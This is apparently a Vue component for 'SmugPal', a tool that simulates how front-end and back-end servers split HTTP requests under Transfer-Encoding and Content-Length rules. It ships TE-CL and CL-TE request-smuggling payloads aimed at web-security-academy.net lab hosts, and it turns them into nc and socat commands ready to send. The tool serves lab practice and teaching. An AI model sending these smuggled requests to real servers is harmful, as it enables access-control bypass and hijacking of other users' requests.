<script setup lang="ts">
import Button from 'primevue/Button'
import Dropdown from 'primevue/dropdown'
import Fieldset from 'primevue/fieldset'
import InputText from 'primevue/inputtext'
import Textarea from 'primevue/textarea'
import { computed, ref } from 'vue'

enum ProcessingMode {
  TE = 'te',
  CL = 'cl',
  TECL = 'tecl',
  CLTE = 'clte',
}

const server1Mode = ref<ProcessingMode>(ProcessingMode.TE)
const server2Mode = ref<ProcessingMode>(ProcessingMode.CL)
const input = ref<string>('')
const sizeCalcInput = ref<string>('')
const colors = ['lightpink', 'lightgreen', 'lightblue', 'lightyellow', 'lightorange', 'lightpurple', 'lightbrown', 'lightgray']
const fontColors = ['black', 'black', 'black', 'black', 'black', 'black', 'black', 'black']
const cmdHostname = ref<string>('example.com')
const cmdPort = ref<string>('80')
const cmdNc = computed(() => process(input.value, server1Mode.value).map((part) => {
  part = part.replace(/'/g, `'"'"'`).replace(/\n/g, '\\r\\n')
  return `printf '${part}' | nc ${cmdHostname.value} ${cmdPort.value}`
}))
const cmdSocat = computed(() => process(input.value, server1Mode.value).map((part) => {
  part = part.replace(/'/g, `'"'"'`).replace(/\n/g, '\\r\\n')
  return `printf '${part}' | socat - OPENSSL:${cmdHostname.value}:${cmdPort.value},verify=0`
}))

const decLength = computed(() => sizeCalcInput.value.replace(/\n/g, '\r\n').length)
const hexLength = computed(() => sizeCalcInput.value.replace(/\n/g, '\r\n').length.toString(16))

const clteTemplate = `POST / HTTP/1.1
Host: 0ada007003e1c1b78832d43d0020006c.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 36

0

GET /flag HTTP/1.1
X-Ignore: XGET / HTTP/1.1
Host: 0ada007003e1c1b78832d43d0020006c.web-security-academy.net

`

const teclTemplate = `POST / HTTP/1.1
Host: 0a0d00d40336daa38033173400be001a.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

28
GET /flag HTTP/1.1
Content-Length: 75

0

GET / HTTP/1.1

`

function setTeclTemplate() {
  input.value = teclTemplate
  server1Mode.value = ProcessingMode.TE
  server2Mode.value = ProcessingMode.CL
}

function setClteTemplate() {
  input.value = clteTemplate
  server1Mode.value = ProcessingMode.CL
  server2Mode.value = ProcessingMode.TE
}

enum State {
  Header,
  Body,
}

function process(x: string, mode: ProcessingMode): string[] {
  x = x.replace(/\n/g, '\r\n')
  const rv = []
  let buf = ''
  let state = State.Header
  while (x.length > 0) {
    switch (state) {
      case State.Header: {
        const idx = x.indexOf('\r\n\r\n')
        if (idx === -1) {
          buf += x + '<em>Error: no CRLFCRLF found while reading headers</em>'
          x = ''
          break
        }
        buf += x.slice(0, idx + 4)
        x = x.slice(idx + 4)
        state = State.Body
        break
      }
      case State.Body: {
        let effectiveMode: ProcessingMode | undefined = mode
        switch(mode) {
          case ProcessingMode.TECL: {
            if (buf.toLowerCase().indexOf('transfer-encoding: ') !== -1) {
              effectiveMode = ProcessingMode.TE
            } else if (buf.toLowerCase().indexOf('content-length: ') !== -1) {
              effectiveMode = ProcessingMode.CL
            } else {
              if (!buf.startsWith('GET ')) {
                buf += '<em>Error: Transfer-Encoding nor Content-Length header not found for TECL mode</em>'
              }
              rv.push(buf)
              buf = ''
              state = State.Header
              effectiveMode = undefined
            }
            break
          }
          case ProcessingMode.CLTE: {
            if (buf.toLowerCase().indexOf('content-length: ') !== -1) {
              effectiveMode = ProcessingMode.CL
            } else if (buf.toLowerCase().indexOf('transfer-encoding: ') !== -1) {
              effectiveMode = ProcessingMode.TE
            } else {
              if (!buf.startsWith('GET ')) {
                buf += '<em>Error: Transfer-Encoding nor Content-Length header not found for CLTE mode</em>'
              }
              rv.push(buf)
              buf = ''
              state = State.Header
              effectiveMode = undefined
            }
            break
          }
          case ProcessingMode.TE: {
            if (buf.toLowerCase().indexOf('transfer-encoding: ') === -1) {
              if (!buf.startsWith('GET ')) {
                buf += '<em>Error: Transfer-Encoding header not found for TE mode</em>'
              }
              rv.push(buf)
              buf = ''
              state = State.Header
              effectiveMode = undefined
            }
            break
          }
          case ProcessingMode.CL: {
            if (buf.toLowerCase().indexOf('content-length: ') === -1) {
              if (!buf.startsWith('GET ')) {
                buf += '<em>Error: Content-Length header not found for CL mode</em>'
              }
              rv.push(buf)
              buf = ''
              state = State.Header
              effectiveMode = undefined
            }
            break
          }
        }

        if (!effectiveMode) {
          break
        }

        switch (effectiveMode) {
          case ProcessingMode.TE: {
            const idx = x.indexOf('\r\n')
            const len = parseInt(x.slice(0, idx), 16)
            if (isNaN(len)) {
              buf += `<em>Error: (${x.slice(0, 10)}...): invalid chunk length</em>`
              rv.push(buf)
              buf = ''
              state = State.Header
              break
            }
            buf += x.slice(0, idx + 2 + len)
            x = x.slice(idx + 2 + len)
            if (!x.startsWith('\r\n')) {
              buf += `<em>Error: (${x.slice(0, 10).trim()}...): expecting CRLF after chunk</em>`
              rv.push(buf)
              buf = ''
              state = State.Header
              break
            }
            buf += '\r\n'
            x = x.slice(2)
            if (len === 0) {
              rv.push(buf)
              buf = ''
              state = State.Header
            }
            break
          }

          case ProcessingMode.CL: {
            const idx = buf.toLowerCase().indexOf('content-length: ')
            console.assert(idx !== -1)
            const len = parseInt(buf.slice(idx).split('\r\n')[0].split(/\s+/)[1])
            buf += x.slice(0, len)
            x = x.slice(len)
            rv.push(buf)
            buf = ''
            state = State.Header
            break
          }

          default:
            throw new Error(`Invalid mode ${effectiveMode}`)
        }
        break
      }
      default:
        throw new Error('Invalid state')
    }
  }

  if (buf.length > 0) {
    rv.push(buf)
  }

  return rv
}

function processThenFormat(input: string, mode: ProcessingMode): string {
  try {
    return process(input, mode)
      .map((part) => part.replace(/\r/g, '<span style="color: gray">\\r</span>').replace(/\n/g, '<span style="color: gray">\\n</span>\n'))
      .map((part, i) => `<span style="background-color: ${colors[i % colors.length]}; color: ${fontColors[i % fontColors.length]}">${part}</span>`)
      .join('')
  } catch (e) {
    return `<span style="background-color: red; color: white; font-weight: bold">${e}</span>`
  }
}

const modeOptions = [
  { name: 'TE (Follow Transfer-Encoding only)', value: ProcessingMode.TE },
  { name: 'CL (Follow Content-Length only)', value: ProcessingMode.CL },
  { name: 'TECL (Prefer Transfer-Encoding; then follow Content-Length)', value: ProcessingMode.TECL },
  { name: 'CLTE (Prefer Content-Length; then follow Transfer-Encoding)', value: ProcessingMode.CLTE },
]
const server1Result = computed(() => processThenFormat(input.value, server1Mode.value))
const server2Result = computed(() => processThenFormat(input.value, server2Mode.value))

setTeclTemplate()
</script>

<template>
  <h1>SmugPal: HTTP Smuggling Visualizer / Simulator / Command Line Generator</h1>
  <div class="flex">
    <Fieldset legend="Settings" style="flex: 1 0 auto">
      <div class="flex">
        <div>
          <div>Server 1 Mode</div>
          <Dropdown v-model="server1Mode" :options="modeOptions" option-label="name" option-value="value"></Dropdown>
        </div>

        <div>
          <div>Server 2 Mode</div>
          <Dropdown v-model="server2Mode" :options="modeOptions" option-label="name" option-value="value"></Dropdown>
        </div>
      </div>
    </Fieldset>

    <Fieldset legend="Templates" style="flex: 1 0 auto">
      <Button link label="TE-CL" @click="setTeclTemplate()"></Button>
      <Button link label="CL-TE" @click="setClteTemplate()"></Button>
    </Fieldset>

    <Fieldset legend="Size Calculator" style="flex: 1 0 auto">
      <textarea style="width: 100%" v-model="sizeCalcInput"></textarea><br />
      Dec: {{ decLength }} &nbsp;&nbsp;&nbsp; Hex: {{ hexLength }}<br />
      <small>(newlines are converted to CRLF (2 bytes) for counting)</small>
    </Fieldset>
  </div>
  <br />

  <Fieldset legend="Simulator" class="simulator">
    <div class="flex">
      <h3 style="flex: 1 0 auto">Input</h3>
      <h3 style="flex: 1 0 auto">Server 1 Sees</h3>
      <h3 style="flex: 1 0 auto">Server 2 Sees</h3>
    </div>

    <div class="flex">
      <div style="flex: 0 0 auto; flex-direction: column" class="flex">
        <Textarea v-model="input" autofocus style="flex: 1 1 auto"></Textarea>
        <br />
        <small style="font-family: sans-serif">(newlines are automatically converted to CRLF during processing)</small>
      </div>

      <pre style="flex: 1 0 auto" v-html="server1Result"></pre>
      <pre style="flex: 1 0 auto" v-html="server2Result"></pre>
    </div>
  </Fieldset>

  <br />

  <Fieldset legend="Command Line">
    <div style="display: flex; gap: 1em">
      <div>
        <label>Hostname</label>&nbsp;
        <InputText placeholder="Hostname" v-model="cmdHostname" />&nbsp;
      </div>
      <div>
        <label>Port</label>&nbsp;
        <InputText placeholder="Port" v-model="cmdPort" />
      </div>
    </div>
    <small style="font-family: sans-serif;">nc (HTTP)</small>
    <pre style="background-color: #eee; padding: 0.5rem; max-width: 100%; white-space: normal; overflow-wrap: break-word;" v-for="(cmd, i) in cmdNc" :key="i">{{ cmd }}</pre>
    <small style="font-family: sans-serif;">socat (HTTPS)</small>
    <pre style="background-color: #eee; padding: 0.5rem; max-width: 100%; white-space: normal; overflow-wrap: break-word;" v-for="(cmd, i) in cmdSocat" :key="i">{{ cmd }}</pre>
  </Fieldset>
</template>

<style scoped>
.flex {
  display: flex;
  gap: 1em;
}

.simulator textarea,
.simulator pre {
  font-family: monospace;
}
</style>
